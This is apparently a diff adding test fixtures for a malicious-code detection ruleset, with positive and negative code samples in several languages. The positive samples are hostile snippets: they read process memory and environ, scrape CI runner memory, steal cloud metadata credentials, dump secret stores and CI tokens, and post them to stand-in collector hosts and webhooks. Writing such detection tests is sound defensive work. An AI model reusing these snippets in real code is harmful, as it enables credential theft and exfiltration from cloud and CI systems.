@@ -1,0 +1,204 @@
+{
+  "secrets-fs/process-memory-read": {
+    "lang": "go",
+    "pos": [
+      "f, _ := os.Open(fmt.Sprintf(\"/proc/%d/environ\", pid))",
+      "if err := unix.PtraceAttach(pid); err != nil {",
+      "mem, _ := os.Open(filepath.Join(\"/proc\", strconv.Itoa(pid), \"mem\"))"
+    ],
+    "neg": [
+      "func PtraceAttach(pid int) (err error) { return ptrace(PTRACE_ATTACH, pid, 0, 0) }",
+      "\tPTRACE_ATTACH = 0x10",
+      "env, _ := os.ReadFile(\"/proc/self/environ\")",
+      "stat, _ := os.ReadFile(fmt.Sprintf(\"/proc/%d/stat\", pid))",
+      "info, _ := os.ReadFile(\"/proc/meminfo\")"
+    ],
+    "also": [
+      ["js", "const fd = fs.openSync(`/proc/${pid}/mem`, 'r');"],
+      ["js", "const env = fs.readFileSync('/proc/' + pid + '/environ', 'utf8');"],
+      ["py", "with open(f'/proc/{pid}/mem', 'rb') as mem:\n    mem.seek(start)"],
+      ["py", "libc.ptrace(PTRACE_ATTACH, pid, None, None)"],
+      ["rs", "let n = nix::sys::uio::process_vm_readv(pid, &mut local, &remote)?;"],
+      ["php", "$h = fopen(\"/proc/$pid/mem\", 'rb');"],
+      ["java", "RandomAccessFile mem = new RandomAccessFile(\"/proc/\" + pid + \"/mem\", \"r\");"],
+      ["sh", "cat /proc/$PID/environ | tr '\\0' '\\n'"]
+    ]
+  },
+  "secrets-fs/ci-runner-memory-scrape": {
+    "lang": "js",
+    "pos": [
+      "const pid = execSync('pgrep -f Runner.Worker').toString().trim();\nconst fd = fs.openSync(`/proc/${pid}/mem`, 'r');",
+      "const pids = findPids('Runner.Listener');\nconst data = scrape(`/proc/${pids[0]}/mem`);\nconst hits = data.match(/\"isSecret\":true/g);"
+    ],
+    "neg": [
+      "const fd = fs.openSync(`/proc/${pid}/mem`, 'r');",
+      "if (process.env.GITHUB_ACTIONS) {\n  core.info('running in GitHub Actions');\n}",
+      "const ci = process.env.GITHUB_ACTIONS === 'true';\nconst own = fs.readFileSync('/proc/self/environ', 'utf8');"
+    ],
+    "also": [
+      [
+        "py",
+        "pid = find_pid('Runner.Worker')\nwith open(f'/proc/{pid}/mem', 'rb') as mem:\n    blob = mem.read(size)\nsecrets = re.findall(rb'\"isSecret\":true', blob)"
+      ],
+      ["sh", "PID=$(pgrep -f Runner.Worker)\nsudo cat /proc/$PID/mem > dump.bin"]
+    ]
+  },
+  "network/cloud-metadata-access": {
+    "lang": "js",
+    "pos": [
+      "const res = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/');",
+      "const r = await fetch('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', { headers: { 'Metadata-Flavor': 'Google' } });"
+    ],
+    "neg": [
+      "const ENV_ENDPOINT_NAME = 'AWS_EC2_METADATA_SERVICE_ENDPOINT';\nconst DEFAULT_ENDPOINT = 'http://169.254.169.254';\nconst DISABLED = 'AWS_EC2_METADATA_DISABLED';",
+      "const host = process.env.GCE_METADATA_HOST || 'metadata.google.internal';\nconst url = `http://${host}/computeMetadata/v1/instance`;",
+      "const imdsHost = 'http://169.254.169.254';\nconst imdsEndpointPath = '/metadata/identity/oauth2/token';\nconst url = new URL(imdsEndpointPath, process.env.AZURE_POD_IDENTITY_AUTHORITY_HOST ?? imdsHost);",
+      "const linkLocal = '169.254.0.0/16';"
+    ],
+    "also": [
+      ["py", "token = requests.put('http://169.254.169.254/latest/api/token', headers=h).text"],
+      ["go", "resp, err := http.Get(\"http://169.254.170.2/v2/credentials/\" + id)"],
+      [
+        "sh",
+        "curl -s -H 'Metadata: true' 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01'"
+      ]
+    ]
+  },
+  "exfiltration/cloud-metadata-to-external": {
+    "lang": "js",
+    "pos": [
+      "const creds = await (await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role)).text();\nawait fetch('https://webhook.site/0000-example', { method: 'POST', body: creds });",
+      "const tok = await get('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token');\nawait post('https://discord.com/api/webhooks/1/example', tok);",
+      "const c = await get('http://169.254.169.254/latest/meta-data/iam/security-credentials/admin');\nawait post('http://203.0.113.7:8080/c', c);"
+    ],
+    "neg": [
+      "const ENDPOINT = 'http://169.254.169.254';\nconst res = await httpRequest({ hostname: '169.254.169.254', path: '/latest/meta-data/iam/security-credentials/', timeout: 1000 });",
+      "const url = 'http://169.254.169.254/latest/api/token';\nconst proxy = 'http://10.0.0.5:3128';",
+      "await fetch('https://webhook.site/0000-example', { body: JSON.stringify(report) });"
+    ],
+    "also": [
+      [
+        "py",
+        "creds = requests.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/admin').text\nrequests.post('https://example.invalid.ngrok.io/c', data=creds)"
+      ],
+      [
+        "sh",
+        "C=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/admin)\ncurl -d \"$C\" https://pipedream.net/example"
+      ]
+    ]
+  },
+  "exfiltration/cloud-metadata-with-env-dump": {
+    "lang": "py",
+    "pos": [
+      "creds = requests.get('http://169.254.169.254/latest/meta-data/iam/security-credentials/' + role).text\npayload = json.dumps(dict(os.environ))",
+      "token = urlopen(Request('http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token')).read()\nfor k, v in os.environ.items():\n    loot[k] = v"
+    ],
+    "neg": [
+      "METADATA_BASE_URL = 'http://169.254.169.254/'\nendpoint = os.environ.get('AWS_EC2_METADATA_SERVICE_ENDPOINT', METADATA_BASE_URL)",
+      "payload = json.dumps(dict(os.environ))\nrequests.post(url, data=payload)",
+      "url = 'http://169.254.169.254/latest/api/token'\nregion = os.environ.get('AWS_REGION')"
+    ],
+    "also": [
+      [
+        "js",
+        "const c = await fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/');\nconst env = JSON.stringify(process.env);"
+      ],
+      [
+        "go",
+        "resp, _ := http.Get(\"http://169.254.169.254/latest/meta-data/iam/security-credentials/\")\nall := os.Environ()"
+      ]
+    ]
+  },
+  "exfiltration/secret-store-dump": {
+    "lang": "js",
+    "pos": [
+      "const { SecretList } = await sm.send(new ListSecretsCommand({}));\nfor (const s of SecretList) out.push(await sm.send(new GetSecretValueCommand({ SecretId: s.ARN })));\nawait fetch('https://webhook.site/0000-example', { method: 'POST', body: JSON.stringify(out) });",
+      "const res = await fetch(`https://${host}/api/v1/secrets`, { headers: { Authorization: `Bearer ${sa}` } });\nawait post('https://api.telegram.org/bot0:example/sendDocument', await res.text());"
+    ],
+    "neg": [
+      "export class ListSecretsCommand extends Command {}\nexport class GetSecretValueCommand extends Command {}\nconst endpoint = `https://secretsmanager.${region}.amazonaws.com`;",
+      "listSecretForAllNamespaces() { return this.request('GET', '/api/v1/secrets'); }\nreadNamespacedSecret(name, ns) { return this.request('GET', `/api/v1/namespaces/${ns}/secrets/${name}`); }",
+      "const v = await sm.send(new GetSecretValueCommand({ SecretId: 'app/db' }));\nawait fetch('https://hooks.slack.com/services/T0/B0/example', { body: 'deployed' });"
+    ],
+    "also": [
+      [
+        "py",
+        "names = [s['Name'] for s in sm.list_secrets()['SecretList']]\nvals = {n: sm.get_secret_value(SecretId=n)['SecretString'] for n in names}\nrequests.post('http://203.0.113.9/c', json=vals)"
+      ],
+      [
+        "go",
+        "it := client.ListSecrets(ctx, req)\nv, _ := client.AccessSecretVersion(ctx, acc)\nhttp.Post(\"https://discord.com/api/webhooks/1/example\", \"text/plain\", body)"
+      ],
+      [
+        "sh",
+        "for k in $(vault kv list -format=json secret/); do vault kv get secret/$k; done > s.txt\ncurl --upload-file s.txt https://transfer.sh/s.txt"
+      ]
+    ]
+  },
+  "secrets-fs/secret-store-cli": {
+    "lang": "js",
+    "pos": [
+      "const all = execSync('kubectl get secrets -A -o json').toString();",
+      "const out = execSync('aws secretsmanager list-secrets --output json').toString();"
+    ],
+    "neg": [
+      "execSync('kubectl get pods -A');",
+      "const status = execSync('vault status').toString();",
+      "execSync('aws secretsmanager create-secret --name app');"
+    ],
+    "also": [
+      ["py", "out = subprocess.check_output('gcloud secrets list --format=json', shell=True)"],
+      ["sh", "az keyvault secret list --vault-name kv -o json"]
+    ]
+  },
+  "secrets-fs/secret-scanner-abuse": {
+    "lang": "js",
+    "pos": [
+      "const url = 'https://github.com/trufflesecurity/trufflehog/releases/download/v3.88.0/trufflehog_3.88.0_linux_amd64.tar.gz';",
+      "const r = spawnSync('trufflehog', ['filesystem', '/', '--only-verified', '--json']);",
+      "const out = execSync(`${bin} filesystem ${os.homedir()} --json`); execFileSync(path.join(dir, 'gitleaks'), ['detect']);"
+    ],
+    "neg": [
+      "const config = path.join(root, '.gitleaks.toml');",
+      "const ignore = readFileSync('.trufflehogignore', 'utf8');",
+      "spawn('git', ['log', '--format=%H']);",
+      "const action = 'gitleaks/gitleaks-action';"
+    ],
+    "also": [
+      ["py", "subprocess.run(['trufflehog', 'filesystem', '/', '--json'], capture_output=True)"],
+      ["go", "cmd := exec.Command(\"gitleaks\", \"detect\", \"--source\", home)"],
+      ["rs", "let out = Command::new(\"noseyparker\").arg(\"scan\").output()?;"],
+      ["java", "Process p = new ProcessBuilder(\"gitleaks\", \"detect\").start();"],
+      ["php", "$out = shell_exec('trufflehog filesystem / --json');"],
+      ["sh", "detect-secrets scan --all-files / > found.json"],
+      ["sh", "ggshield secret scan path -r ~"]
+    ]
+  },
+  "exfiltration/ci-token-harvest": {
+    "lang": "js",
+    "pos": [
+      "const keys = ['GITHUB_TOKEN', 'NPM_TOKEN', 'AWS_SECRET_ACCESS_KEY'];\nconst loot = keys.map((k) => process.env[k]);\nawait fetch('https://collector.example.invalid/c', { method: 'POST', body: JSON.stringify(loot) });",
+      "const gh = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;\nconst az = process.env.AZURE_CLIENT_SECRET;\naxios.post('https://collector.example.invalid', { gh, az });"
+    ],
+    "neg": [
+      "const token = process.env.GITHUB_TOKEN || process.env.GH_TOKEN;\nconst res = await fetch('https://api.github.com/repos/o/r/releases', { headers: { authorization: `token ${token}` } });",
+      "const token = process.env.NPM_TOKEN || process.env.NODE_AUTH_TOKEN;\nawait fetch(registry, { headers: { authorization: `Bearer ${token}` } });",
+      "const ready = Boolean(process.env.GITHUB_TOKEN && process.env.NPM_TOKEN);\nconsole.log(ready);"
+    ],
+    "also": [
+      [
+        "py",
+        "tokens = {k: os.environ.get(k) for k in ('CI_JOB_TOKEN', 'AWS_SECRET_ACCESS_KEY')}\nrequests.post('https://collector.example.invalid', json=tokens)"
+      ],
+      [
+        "go",
+        "t := os.Getenv(\"GITHUB_TOKEN\") + \":\" + os.Getenv(\"NPM_TOKEN\")\nhttp.Post(\"https://collector.example.invalid\", \"text/plain\", strings.NewReader(t))"
+      ],
+      [
+        "java",
+        "String t = System.getenv(\"CIRCLE_TOKEN\") + System.getenv(\"AWS_SECRET_ACCESS_KEY\");\nHttpURLConnection c = (HttpURLConnection) url.openConnection();"
+      ],
+      ["sh", "curl -s -d \"a=$GITHUB_TOKEN&b=$NPM_TOKEN\" https://collector.example.invalid/c"]
+    ]
+  }
+}
